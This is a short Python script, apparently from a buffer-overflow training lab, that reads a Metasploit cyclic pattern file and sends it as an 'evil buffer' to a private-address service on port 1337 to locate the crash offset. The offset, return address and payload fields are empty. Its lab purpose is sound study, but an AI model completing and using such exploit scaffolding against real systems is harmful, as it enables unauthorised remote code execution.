#!/usr/bin/python3

import socket

class exploit():
	def __init__(self):
		self.prefix = "OVERFLOW1 "
		self.offset = 0
		self.overflow = "A" * self.offset
		self.retn = ""
		self.padding = ""
		self.postfix = ""

	# This function loads the cyclic pattern file generated using pattern_create.rb
	# using the metasploit framework.
	def readCyclicPatternFile(self):
		self.f = open("exploitPattern", "r")
		self.cyclicPattern = self.f.read()
		self.payload = self.cyclicPattern
		self.buffer = self.prefix + self.overflow + self.retn + self.padding + self.payload + self.postfix

	# Create a socket and connecto the target machine
	def sendExploit(self):
		# Call funtion to read contents of exploitPattern
		self.readCyclicPatternFile()
		ip = "10.10.144.211"
		port = 1337
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((ip, port))
			print("Sending evil buffer...")
			s.send(bytes(self.buffer + "\r\n", "latin-1"))
			print("Done!")
		except:
			print("Could not connect.")

def main():
	p = exploit()
	p.sendExploit()

if __name__ == "__main__":
	main()
